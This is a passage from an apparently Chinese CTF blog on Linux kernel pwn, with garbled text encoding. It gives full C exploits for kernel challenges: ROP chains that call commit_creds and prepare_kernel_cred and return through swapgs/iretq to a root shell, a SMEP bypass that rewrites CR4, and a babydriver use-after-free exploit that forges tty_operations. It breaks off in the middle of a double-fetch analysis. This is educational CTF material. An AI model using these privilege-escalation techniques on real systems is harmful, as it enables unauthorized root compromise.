class="hljs-params">()</span></span>;<br><span class="hljs-comment">// get shell and root privilege.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *(*pkc)(<span class="hljs-keyword">int</span>) = prepare_addr;<br>    <span class="hljs-keyword">void</span> (*cc)(<span class="hljs-keyword">char</span> *) = commit_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set_rop</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> *rop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// get_root-&gt;ret from kernel-&gt;get_shell(as rip)</span><br>    <span class="hljs-keyword">size_t</span> vm_off = vmlinux_base - VMLINUX_RAW_BASE;<br>    rop[<span class="hljs-number">8</span>] = canary;<br>    rop[<span class="hljs-number">10</span>] = (<span class="hljs-keyword">size_t</span>)get_root;<br>    rop[<span class="hljs-number">11</span>] = <span class="hljs-number">0xffffffff81a012da</span> + vm_off; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;<br>    rop[<span class="hljs-number">13</span>] = <span class="hljs-number">0xffffffff81050ac2</span> + vm_off; <span class="hljs-comment">// iretq; ret;</span><br>    rop[<span class="hljs-number">14</span>] = (<span class="hljs-keyword">size_t</span>)get_shell;<br>    rop[<span class="hljs-number">15</span>] = user_cs;<span class="hljs-number">3</span><br>    rop[<span class="hljs-number">16</span>] = user_eflags;<br>    rop[<span class="hljs-number">17</span>] = user_rsp;<br>    rop[<span class="hljs-number">18</span>] = user_ss;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">copy_func</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] copy from user with size: %ld\n&quot;</span>, size);<br>    ioctl(proc_fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    proc_fd = open(PROC_PATH, O_RDWR);<br>    <span class="hljs-keyword">if</span> (proc_fd == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error on opening %s!&quot;</span>, PROC_PATH);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;test string&quot;</span>);<br>    parse_kallsyms();<br>    get_canary();<br><br>    save_context();<br>    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">40</span>];<br>    set_rop(rop);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] DEBUG&quot;</span>);<br>    getchar();<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    write(proc_fd, rop, <span class="hljs-number">40</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>));<br>    copy_func(<span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_context</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_rsp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]status has been saved.&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="BYPASS-SMEP"><a href="#BYPASS-SMEP" class="headerlink" title="BYPASS-SMEP"></a>BYPASS-SMEP</h3><blockquote><p>check whether the smep is enabled.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">grep smep /proc/cpuinfo<br></code></pre></div></td></tr></table></figure><h4 id="smep-å’Œ-CR4-å¯„å­˜å™¨"><a href="#smep-å’Œ-CR4-å¯„å­˜å™¨" class="headerlink" title="smep å’Œ CR4 å¯„å­˜å™¨"></a>smep å’Œ CR4 å¯„å­˜å™¨</h4><p>ç³»ç»Ÿæ ¹æ® CR4 å¯„å­˜å™¨çš„å€¼åˆ¤æ–­æ˜¯å¦å¼€å¯ smep ä¿æŠ¤ï¼Œå½“ CR4 å¯„å­˜å™¨çš„ç¬¬ 20 ä½æ˜¯ 1 æ—¶ï¼Œä¿æŠ¤å¼€å¯ï¼›æ˜¯ 0 æ—¶ï¼Œä¿æŠ¤å…³é—­ã€‚</p><img src="../../image/CTF_newly_start/smep.jpg" alt="smep" style="zoom:80%;" /><p>ä¾‹å¦‚ï¼Œå½“</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000<br></code></pre></div></td></tr></table></figure><p>æ—¶ï¼Œsmep ä¿æŠ¤å¼€å¯ã€‚è€Œ CR4 å¯„å­˜å™¨æ˜¯å¯ä»¥é€šè¿‡ mov æŒ‡ä»¤ä¿®æ”¹çš„ï¼Œå› æ­¤åªéœ€è¦</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">mov cr4, 0x1407e0<br># 0x1407e0 = 101 0 0000 0011 1111 00000<br></code></pre></div></td></tr></table></figure><p>å³å¯å…³é—­ smep ä¿</p><p>æœç´¢ä¸€ä¸‹ä» <code>vmlinux</code> ä¸­æå–å‡ºçš„ gadgetï¼Œå¾ˆå®¹æ˜“å°±èƒ½è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚</p><p>å¦‚ä½•æŸ¥çœ‹ CR4 å¯„å­˜å™¨çš„å€¼ï¼Ÿ</p><ul><li>gdb æ— æ³•æŸ¥çœ‹ cr4 å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥é€šè¿‡ kernel crash æ—¶çš„ä¿¡æ¯æŸ¥çœ‹ã€‚ä¸ºäº†å…³é—­ smep ä¿æŠ¤ï¼Œå¸¸ç”¨ä¸€ä¸ªå›ºå®šå€¼ <code>0x6f0</code>ï¼Œå³ <code>mov cr4, 0x6f0</code>ã€‚</li></ul></blockquote><h4 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h4><p>æ˜¯ä¹‹å‰çš„UAFçš„é‚£ä¸€é¢˜çš„å¦ä¸€ç§åšæ³•. </p><p>æ²¡æœ‰æä¾›vmlinux(å†…æ ¸é•œåƒ), å”¯ä¸€çš„bzImageæ˜¯å·²å‹ç¼©çš„é•œåƒæ–‡ä»¶, extract_vmlinuxè„šæœ¬å®é™…ä¸Šå°±æ˜¯ç”¨äº†æœ€åŸºç¡€çš„sh shellåŠ ä¸Šå°è¯•ä¸€å †è§£å‹å‘½ä»¤, å“ªä¸€ä¸ªèƒ½ç”¨å°±æŠŠä»–è§£å‹å‡ºæ¥åˆ°tmpæ–‡ä»¶å¤¹ä¸‹, ç»è¿‡checkåæŠŠtmpä¸­è§£å‹åçš„æ–‡ä»¶catåˆ°stdout. </p><p>å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸€æ¡å‘½ä»¤è§£å‹å‡ºvmlinux: </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></div></td></tr></table></figure><p>æ²¡æœ‰å¼€kaslr, .koå›ºå®šåœ¨81000çš„ä½ç½®. æ‰€è¦çš„åœ°å€å¯ä»¥ç›´æ¥ç¡¬ç¼–ç .</p><p>åç»­è¯¦è§WiKi. å°±æ˜¯æƒ³UAFNé‚£é¢˜ä¸€æ ·é‡æ–°æ‰“å¼€æ–‡ä»¶æ¥æ§åˆ¶ä¸€ä¸ªttyç»“æ„ä½“. ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ</p><p><b style='color:red;background:yellow'>ç„¶åå†ä»”ç»†çœ‹äº†çœ‹, æœç„¶åˆæ˜¯ä¸€å †æ²¡æ³¨æ„åˆ°çš„ç»†èŠ‚â€¦..</b> </p><p>expå¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> commit_creds_addr 0xffffffff810a1420</span><br><br><span class="hljs-keyword">void</span>* fake_tty_operations[<span class="hljs-number">30</span>];<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]status has been saved.&quot;</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* (*pkc)(<span class="hljs-keyword">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-keyword">void</span> (*cc)(<span class="hljs-keyword">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    save_status();<br><br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">32</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    rop[i++] = <span class="hljs-number">0xffffffff810d238d</span>;      <span class="hljs-comment">// pop rdi; ret;</span><br>    rop[i++] = <span class="hljs-number">0x6f0</span>;<br>    rop[i++] = <span class="hljs-number">0xffffffff81004d80</span>;      <span class="hljs-comment">// mov cr4, rdi; pop rbp; ret;</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-keyword">size_t</span>)get_root;<br>    rop[i++] = <span class="hljs-number">0xffffffff81063694</span>;      <span class="hljs-comment">// swapgs; pop rbp; ret;</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = <span class="hljs-number">0xffffffff814e35ef</span>;      <span class="hljs-comment">// iretq; ret;</span><br>    rop[i++] = (<span class="hljs-keyword">size_t</span>)get_shell;<br>    rop[i++] = user_cs;                <span class="hljs-comment">/* saved CS */</span><br>    rop[i++] = user_rflags;            <span class="hljs-comment">/* saved EFLAGS */</span><br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++)<br>    &#123;    <span class="hljs-comment">//å…¶å®å°±æ˜¯ä¸ªå¡«å……, åªæœ‰writeå‡½æ•°æœ‰ç”¨åˆ°ç¬¬8ä¸ª, ä¸ºäº†æ–¹ä¾¿å…¨éƒ¨å¡«æˆä¸€æ ·çš„.</span><br>        fake_tty_operations[i] = <span class="hljs-number">0xFFFFFFFF8181BFC5</span>; <span class="hljs-comment">// mov rsp,rax ; dec ebx ; ret</span><br>    &#125;<br>    fake_tty_operations[<span class="hljs-number">0</span>] = <span class="hljs-number">0xffffffff810635f5</span>;  <span class="hljs-comment">//pop rax; pop rbp; ret;</span><br>    fake_tty_operations[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">size_t</span>)rop;<br>    <span class="hljs-comment">//fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;  // mov rsp,rax ; dec ebx ; ret</span><br><br>    <span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>    close(fd1);<br><br>    <span class="hljs-keyword">int</span> fd_tty = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);<br>    <span class="hljs-keyword">size_t</span> fake_tty_struct[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    read(fd2, fake_tty_struct, <span class="hljs-number">32</span>);<br>    fake_tty_struct[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">size_t</span>)fake_tty_operations;<br>    write(fd2,fake_tty_struct, <span class="hljs-number">32</span>);<br><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    write(fd_tty, buf, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>fake_tty_struct</code>ä¸­çš„ç¬¬å››ä¸ªå°±æ˜¯opsçš„å‡½æ•°æŒ‡é’ˆæ•°ç»„, æŠŠæ„é€ å¥½çš„<code>fake_tty_operations</code>åœ°å€å¡«åˆ°é‡Œé¢å³å¯. </p><p>ç„¶åå°±æ˜¯opsçš„æ„é€ . é¦–å…ˆè¦çœ‹å†…æ ¸æ˜¯å¦‚ä½•è°ƒç”¨opsçš„:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">  0xffffffff814dc0b6    mov    rax, qword ptr [rbx + 0x18]<br>  0xffffffff814dc0ba    mov    edx, r12d<br>  0xffffffff814dc0bd    mov    rsi, r13<br>  0xffffffff814dc0c0    mov    rdi, rbx<br>â–º 0xffffffff814dc0c3    call   qword ptr [rax + 0x38]<br><br>  0xffffffff814dc0c6    mov    rdi, r14<br>  0xffffffff814dc0c9    mov    r15d, eax<br>  0xffffffff814dc0cc    call   0xffffffff81817ae0<br></code></pre></div></td></tr></table></figure><p>æœ‰æ ‡è®°çš„ä¸€è¡Œå°±æ˜¯å¯¹å‡½æ•°æŒ‡é’ˆçš„ä½¿ç”¨, å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨äº†raxæ¥å­˜æŒ‡é’ˆæ•°ç»„çš„åŸºå€, æ‰€ä»¥åœ¨gadgetä¸­å¯ä»¥ä½¿ç”¨<code>mov rsp, rax; ret</code> è¿™ç§gadget. ä½†æ˜¯è¿™ç‰¹ä¹ˆä¹Ÿå¤ªéš¾æ‰¾äº†, expé‡Œé¢ç”¨çš„é‚£ä¸ªæ˜¯<code>mov rsp, rax; dec rbx; jmp -&gt; ret</code>çš„ç»„åˆ, æ²¡æœ‰å“ªä¸ªå·¥å…·ä¼šè‡ªåŠ¨æœç´¢åˆ°è¿™ä¸ªgadget, åªèƒ½æŠŠæ‰€æœ‰çš„gadgetæ‰¾å‡ºæ¥ç„¶åå†è¾“å‡ºæ–‡ä»¶ä¸­æœç´¢. æ¯”å¦‚ä¸‹é¢è¿™æ ·:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary vmlinux &gt; gadget</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-keyword">in</span> gadget</span><br>...<br>459047 0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e<br>...<br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-keyword">in</span> ropper interactive console</span><br><span class="hljs-meta">(vmlinux/ELF/x86_64)&gt;</span><span class="bash"> disasm_address 0xffffffff8181bf7e</span><br>Instructions<br>============<br>0xffffffff8161bf7e: ret<br></code></pre></div></td></tr></table></figure><p>è¿™æ ·æ‰ç®—æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ª. </p><blockquote><p>å¦‚æœè¦dumpæŒ‡å®šçš„åœ°å€, æˆ‘çœ‹æœ€æ–¹ä¾¿çš„è¿˜æ˜¯æŠŠæ•´ä¸ªvmlinuxéƒ½åæ±‡ç¼–å‡ºæ¥, ropperåŠ è½½è¿˜æ˜¯æŒºæ…¢çš„(ä¸€æ¬¡ç›´æ¥æŠŠ3Gå†…å­˜åƒæ²¡äº†, ç»). æˆ‘è¿˜æ˜¯ç”¨ROPgadgetå§, ropperæœåŠå¤©è¿˜ä¼šå¡ä½. æœå®Œä¹‹åä¸€ä¸ªæ–‡ä»¶44M, çœŸçš„å¤§.</p></blockquote><p><strong>å› ä¸ºè¿™é‡Œæ²¡æœ‰writeæ¼æ´å¯ä»¥åˆ©ç”¨, é‚£ä¹ˆæœ€ç»ˆçš„ç›®çš„å°±æ˜¯å°†rspæ”¹ä¸ºropæŒ‡é’ˆçš„å€¼, æ‰€ä»¥å°±è¦é‡å¤ä¿®æ”¹rsp</strong>:</p><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œopsä¸­çš„<code>write</code>ä¹‹åæ­¤æ—¶çš„rspå°±æŒ‡å‘äº†æŒ‡é’ˆæ•°ç»„çš„å¼€å¤´, æˆ‘ä»¬å¡«å…¥çš„0 1 <del>3</del>å·å°±æ˜¯ä»æ ˆé¡¶å¼€å§‹è®¡æ•°çš„QWORDåŒºåŸŸ(3å·å¯ä»¥å»æ‰, é™¤äº†æç¤ºæ²¡æœ‰ä½œç”¨), ç„¶åå†é€šè¿‡:</p><ul><li><code>pop rax; pop rbp; ret</code>: rax = rop</li><li><code>mov rsp, rax; dec rbx; jmp ???; ret</code>: rsp = rop; bingo</li></ul><p>ç°åœ¨rspå·²å®šä½åˆ°ropæŒ‡å‘çš„fake stackä¸Š, å¯ä»¥é¡ºåˆ©è¿›è¡Œropäº†.</p><blockquote><p>å†™äº†å‡ è¡Œè‡ªåŠ¨åæ±‡ç¼–æŒ‡å®šåœ°å€çš„shell, æ”¾åœ¨pwnshé‡Œé¢. vmlinux-disasm</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>vm=./vmlinux<br>if [ ! -e $vm ]; then<br>    echo vmlinux not Exits!<br>    exit 1<br>fi<br>realpath $vm<br>len=30<br>if [ $# -eq 0 ]; then<br>    echo &#x27;Need Address Argument!&#x27;<br>    exit 1<br>fi<br>if [ $2 ]; then<br>    len=$2<br>fi<br>objdump $vm -d -Mintel --start-address=$1 --stop-address=$(printf 0x%x $(($1+$len))) <br></code></pre></div></td></tr></table></figure></blockquote><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h3><h4 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h4><p><em><strong>USING RACE CONDITION</strong></em> :</p><p>è¿™é¢˜çš„initè°ƒç”¨äº†<code>misc_register()</code>, ä½œç”¨: Register a miscellaneous device with the kernel. æ‰€ä»¥è¿™ä¸ªè®¾å¤‡ä¼šåœ¨/devä¸‹, åç§°ä¸ºbaby.</p><p>é©±åŠ¨ä¸»è¦æ³¨å†Œäº†ä¸€ä¸ª <code>baby_ioctl</code> å‡½æ•°ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªåŠŸèƒ½ã€‚å½“ ioctl ä¸­ cmd å‚æ•°ä¸º 0x6666 æ—¶ï¼Œé©±åŠ¨å°†è¾“å‡º flag çš„åŠ è½½åœ°å€ã€‚å½“ ioctl ä¸­ cmd å‚æ•°ä¸º 0x1337 æ—¶ï¼Œé¦–å…ˆè¿›è¡Œä¸‰ä¸ªæ ¡éªŒï¼Œæ¥ç€å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹ä¸ç¡¬ç¼–ç çš„ flag è¿›è¡Œé€å­—èŠ‚æ¯”è¾ƒï¼Œå½“ä¸€è‡´æ—¶é€šè¿‡ <code>printk</code> å°† flag è¾“å‡ºå‡ºæ¥ã€‚</p><p>è€Œåˆ†æå…¶æ£€æŸ¥å‡½æ•°ï¼Œå…¶ä¸­ <code>_chk_range_not_ok</code> ä¸ºæ£€æŸ¥æŒ‡é’ˆåŠé•¿åº¦èŒƒå›´æ˜¯å¦æŒ‡å‘ç”¨æˆ·ç©ºé—´ã€‚é€šè¿‡å¯¹é©±åŠ¨æ–‡ä»¶åŠŸèƒ½çš„åˆ†æï¼Œå¯ä»¥å¾—åˆ°ç”¨æˆ·è¾“å…¥çš„æ•°æ®ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00000000 </span>attr            struc ; (sizeof=<span class="hljs-number">0</span>x10, mappedto_3)<br><span class="hljs-symbol">00000000 </span>flag_str        dq ?<br><span class="hljs-symbol">00000008 </span>flag_len        dq ?<br><span class="hljs-symbol">00000010 </span>attr            ends<br></code></pre></div></td></tr></table></figure><p>å…¶æ£€æŸ¥å†…å®¹ä¸ºï¼š</p><ol><li>è¾“å…¥çš„æ•°æ®æŒ‡é’ˆæ˜¯å¦ä¸ºç”¨æˆ·æ€æ•°æ®ã€‚</li><li>æ•°æ®æŒ‡é’ˆå†… flag_str æ˜¯å¦æŒ‡å‘ç”¨æˆ·æ€ã€‚</li><li>æ®æŒ‡é’ˆå†… flag_len æ˜¯å¦ç­‰äºç¡¬ç¼–ç  flag çš„é•¿åº¦ã€‚é•¿åº¦é€šè¿‡IDAæŸ¥çœ‹åæ•°å‡ºæ¥æ˜¯33.</li></ol><blockquote><p>å…³äºæ£€æŸ¥ç”¨æˆ·åŒºæŒ‡é’ˆå‡½æ•°:</p><p>å‡½æ•°çš„åç¼–è¯‘ä»£ç ä¸º: <code>!_chk_range_not_ok(a3, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358))</code>, è¿™ä¸€æ¡æ˜¯æ£€æŸ¥ä¼ å…¥ioctlçš„æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ç”¨æˆ·åŒº, ä¸‹é¢è§£é‡Šä¸€ä¸‹ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ€ä¹ˆå›äº‹.</p><p>åœ¨å†…æ ¸ä¸­ä¹Ÿæœ‰ä¸€ä¸ªæ£€æŸ¥æ˜¯å¦æ˜¯ç”¨æˆ·åŒºæŒ‡é’ˆçš„å‡½æ•°, é¦–å…ˆæ˜¯ä¸€ä¸ªå®å®šä¹‰: <code>#define access_ok(addr, size)</code>, ç„¶åè°ƒç”¨äº†<br><code>likely(__access_ok(addr, size));</code>, é‡ç‚¹å°±åœ¨__access_okè¿™ä¸ªå‡½æ•°ä¸Š(in <code>/include/asm-generic/access_ok.h</code>) :</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * &#x27;size&#x27; is a compile-time constant for most callers, so optimize for</span><br><span class="hljs-comment"> * this case to turn the check into a single comparison against a constant</span><br><span class="hljs-comment"> * limit and catch all possible overflows.</span><br><span class="hljs-comment"> * On architectures with separate user address space (m68k, s390, parisc,</span><br><span class="hljs-comment"> * sparc64) or those without an MMU, this should always return true.</span><br><span 